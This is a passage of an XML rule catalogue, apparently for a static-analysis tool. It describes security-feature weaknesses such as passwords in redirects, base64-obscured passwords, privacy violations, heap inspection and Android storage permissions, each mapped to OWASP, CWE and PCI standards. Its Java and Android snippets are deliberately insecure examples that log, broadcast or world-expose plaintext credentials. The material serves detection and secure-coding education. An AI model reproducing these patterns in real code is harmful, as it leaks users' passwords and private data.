							  An HTTP redirect causes the user's web browser to issue an HTTP GET request. By convention, the parameters associated with an HTTP GET are not treated as sensitive data, so web servers log them, proxies cache them, and web browsers do not make an effort to conceal them. Sending a password or other sensitive data as part of a redirect will likely cause the data to be mishandled and potentially revealed to an attacker.<br><br><b>Example 1:</b><br><pre><br>response.sendRedirect("j_security_check?j_username="+usr+"&amp;j_password="+pass);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management_weak_cryptography</key>
		<internalKey>Security Features/Password Management/Weak Cryptography
		</internalKey>
		<name>Password Management: Weak Cryptography</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Obscuring a password with a trivial encoding does not protect the password.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. A programmer can attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password.<br><br><br><b>Example 1:</b> The following code reads a password from a properties file and uses the password to connect to a database.<br><br><pre><br>...<br>Properties prop = new Properties();<br>prop.load(new FileInputStream("config.properties"));<br>String password = Base64.decode(prop.getProperty("password"));<br><br>DriverManager.getConnection(url, usr, password);<br>...<br></pre><br><br>This code will run successfully, but anyone with access to <code>config.properties</code> can read the value of <code>password</code> and easily determine that the value has been base 64 encoded. If a devious employee has access to this information, they can use it to break into the system.<br><br>In the mobile world, password management is even trickier, considering a much higher chance of device loss.<br><b>Example 2:</b> The code below reads username and password from an Android WebView store and uses them to setup authentication for viewing protected pages.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);<br>    String username = new String(Base64.decode(credentials[0], DEFAULT));<br>    String password = new String(Base64.decode(credentials[1], DEFAULT));<br>    handler.proceed(username, password);<br>  }<br>});<br>...<br></pre><br><br>By default, WebView credentials are stored in plaintext and are not hashed. So if a user has a rooted device (or uses an emulator), she is able to read stored passwords for given sites.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 261</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[19]  <em>SQLCipher.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privacy_violation</key>
		<internalKey>Security Features/Privacy Violation</internalKey>
		<name>Privacy Violation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Mishandling private information, such as customer passwords or social security numbers, can compromise user privacy and is often illegal. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Privacy violations occur when:<br><br>1. Private user information enters the program.<br><br>2. The data is written to an external location, such as the console, file system, or network.<br><br><br><b>Example 1:</b> The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the <code>getPassword()</code> function returns the user-supplied plaintext password associated with the account.<br><br><pre><br>pass = getPassword();<br>...<br>dbmsLog.println(id+":"+pass+":"+type+":"+tstamp);<br></pre><br><br>The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.<br><br>Privacy is one of the biggest concerns in the mobile world for a couple of reasons. One of them is a much higher chance of device loss. The other has to do with inter-process communication between mobile applications. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. Sensitive information should never be part of inter-process communication between mobile applications.<br><br><b>Example 2:</b> The code below reads username and password for a given site from an Android WebView store and broadcasts them to all the registered receivers.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);<br>    String username = credentials[0];<br>    String password = credentials[1];<br>    Intent i = new Intent();<br>    i.setAction("SEND_CREDENTIALS");<br>    i.putExtra("username", username);<br>    i.putExtra("password", password);<br>    view.getContext().sendBroadcast(i);<br>  }<br>});<br>...<br></pre><br><br>There are several problems with this example. First of all, by default, WebView credentials are stored in plaintext and are not hashed. So if a user has a rooted device (or uses an emulator), she is able to read stored passwords for given sites. Second, plaintext credentials are broadcast to all the registered receivers, which means that any receiver registered to listen to intents with the <code>SEND_CREDENTIALS</code> action will receive the message. The broadcast is not even protected with a permission to limit the number of recipients, even though in this case, we do not recommend using permissions as a fix.<br><br>Private data can enter a program in a variety of ways:<br><br>- Directly from the user in the form of a password or personal information<br><br>- Accessed from a database or other data store by the application<br><br>- Indirectly from a partner or other third party<br><br>Typically, in the context of the mobile world, this private information would include (along with passwords, SSNs and other general personal information):<br><br>- Location<br><br>- Cell phone number<br><br>- Serial numbers and device IDs<br><br>- Network Operator information<br><br>- Voicemail information<br><br>Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.<br><br>Security and privacy concerns often seem to compete with each other. From a security perspective, you should record all important operations so that any anomalous activity can later be identified. However, when private data is involved, this practice can create risk.<br><br>Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable to store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted. For example, in 2004, an unscrupulous employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [1].<br><br>In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated. Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations:<br><br>- Safe Harbor Privacy Framework [3]<br><br>- Gramm-Leach Bliley Act (GLBA) [4]<br><br>- Health Insurance Portability and Accountability Act (HIPAA) [5]<br><br>- California SB-1386 [6]<br><br>Despite these regulations, privacy violations continue to occur with alarming frequency.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] J. Oates <em>AOL man pleads guilty to selling 92m email addies</em> The Register<br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9]  <em>California SB-1386</em> Government of the State of California<br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[11]  <em>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</em> Federal Trade Commission<br></p>
																									   <p>[12]  <em>Health Insurance Portability and Accountability Act (HIPAA)</em> U.S. Department of Human Services<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[15]  <em>Privacy Initiatives</em> U.S. Federal Trade Commission<br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[20]  <em>Safe Harbor Privacy Framework</em> U.S. Department of Commerce<br></p>
																									   <p>[21]  <em>SQLCipher.</em> <br></p>
																									   <p>[22] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privacy_violation_android_internal_storage
		</key>
		<internalKey>Security Features/Privacy Violation/Android Internal
			Storage
		</internalKey>
		<name>Privacy Violation: Android Internal Storage</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Mishandling private information, such as customer passwords or social security numbers, can compromise user privacy and is often illegal. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Privacy violations occur when:<br><br>1. Private user information enters the program.<br><br>2. The data is written to an external location, such as the console, file system, or network.<br><br><br><br><b>Example 1:</b> The following code stores user preferences using Android's SharedPreferences class. Among other values that are stored, the user supplied <code>password</code> is stored on the device in plaintext.<br><br><pre><br>SharedPreferences userPreferences = this.getSharedPreferences("userPreferences", MODE_WORLD_READABLE);<br>SharedPreferences.Editor editor = userPreferences.editor();<br>editor.putString("username", userName);<br>editor.putString("password", password);<br>...<br>editor.language("language", language);<br>...<br></pre><br><br>Although by default Android's <code>SharedPreferences</code> are private to the application and cannot be accessed by other applications, physical access to the device could potentially allow access to these files.  Furthermore, in the example above, setting the mode to <code>MODE_WORLD_READABLE</code> makes the preference file available to other applications, further violating user privacy.<br><br>Many developers trust the filesystem as a safe storage location for data, but it should not be trusted implicitly, particularly when privacy is a concern.<br><br>Private data can enter a program in a variety of ways:<br><br>- Directly from the user in the form of a password or personal information<br><br>- Accessed from a database or other data store by the application<br><br>- Indirectly from a partner or other third party<br><br>Typically, in the context of the mobile world, this private information would include (along with passwords, SSNs and other general personal information):<br><br>- Location<br><br>- Cell phone number<br><br>- Serial numbers and device IDs<br><br>- Network Operator information<br><br>- Voicemail information<br><br>Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.<br><br>Security and privacy concerns often seem to compete with each other. From a security perspective, you should record all important operations so that any anomalous activity can later be identified. However, when private data is involved, this practice can create risk.<br><br>Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable to store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted. For example, in 2004, an unscrupulous employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [1].<br><br>In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated. Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations:<br><br>- Safe Harbor Privacy Framework [3]<br><br>- Gramm-Leach Bliley Act (GLBA) [4]<br><br>- Health Insurance Portability and Accountability Act (HIPAA) [5]<br><br>- California SB-1386 [6]<br><br>Despite these regulations, privacy violations continue to occur with alarming frequency.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[4] J. Oates <em>AOL man pleads guilty to selling 92m email addies</em> The Register<br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[10]  <em>California SB-1386</em> Government of the State of California<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[12]  <em>Designing for Security</em> Android<br></p>
																									   <p>[13]  <em>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</em> Federal Trade Commission<br></p>
																									   <p>[14]  <em>Health Insurance Portability and Accountability Act (HIPAA)</em> U.S. Department of Human Services<br></p>
																									   <p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[17]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[18]  <em>Privacy Initiatives</em> U.S. Federal Trade Commission<br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[23]  <em>Safe Harbor Privacy Framework</em> U.S. Department of Commerce<br></p>
																									   <p>[24] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privacy_violation_heap_inspection</key>
		<internalKey>Security Features/Privacy Violation/Heap Inspection
		</internalKey>
		<name>Privacy Violation: Heap Inspection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing sensitive data in a <code>String</code> object makes it impossible to reliably purge the data from memory.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sensitive data (such as passwords, social security numbers, credit card numbers etc) stored in memory can be leaked if memory is not cleared after use. Often, <code>String</code>s are used store sensitive data, however, since <code>String</code> objects are immutable, removing the value of a <code>String</code> from memory can only be done by the JVM garbage collector. The garbage collector is not required to run unless the JVM is low on memory, so there is no guarantee as to when garbage collection will take place. In the event of an application crash, a memory dump of the application might reveal sensitive data.<br><br><b>Example 1:</b> The following code converts a password from a character array to a <code>String</code>.<br><pre><br>private JPasswordField pf;<br>...<br>final char[] password = pf.getPassword();<br>...<br>String passwordAsString = new String(password);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 226</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] L. Gong, G. Ellison, and M. Dageforde <em>Inside Java 2 Platform Security: Architecture, API Design, and Implementation, 2nd ed.</em> Addison-Wesley<br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-4 Information in Shared Resources (P1)</em> <br></p>
																									   <p>[19] M. S. Ware <em>Writing secure Java code: taxonomy of heuristics and an evaluation of static analysis tools</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privacy_violation_password</key>
		<internalKey>Security Features/Privacy Violation/Password
		</internalKey>
		<name>Privacy Violation: Password</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A viewed password endangers system security.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A password need not be viewable to its owner, and must not be viewable to others. If a password is displayed, anyone in the vicinity could see and use it to compromise the system. In computer security, shoulder surfing refers to using direct observation techniques, such as looking over someone's shoulder, to get information. Shoulder surfing is particularly effective in crowded, public environments. This threat particularly applies to mobile devices, which are generally intended for use in all environments, both private or public.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2]  <em>Android Developers-Reference: EditText</em> <br></p>
																									   <p>[3] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 549</em> <br></p>
																									   <p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>IA-6 Authenticator Feedback (P2)</em> <br></p>
																									   <p>[5] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_amazon_web_services_unchecked_permissions
		</key>
		<internalKey>Security Features/Privilege Management/Amazon Web
			Services Unchecked Permissions
		</internalKey>
		<name>Privilege Management: Amazon Web Services Unchecked Permissions
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unchecked arguments to methods that control permissions or access control lists can allow attackers to access sensitive data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Attackers can exploit vulnerabilities in unchecked permissions in the following way:<br><br>1. Data enters the application from an untrusted source.<br><br>2. The data is used to represent the user or group identifier, list of permissions, or the resource to which the permission is applied, without undergoing any prior sanity checks. The application then uses this non-sanitized data to edit permission settings.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_android_data_storage</key>
		<internalKey>Security Features/Privilege Management/Android Data
			Storage
		</internalKey>
		<name>Privilege Management: Android Data Storage</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program requests permission to write data to Android's external storage.
							</p>
							<h2>EXPLANATION</h2>
							<p>
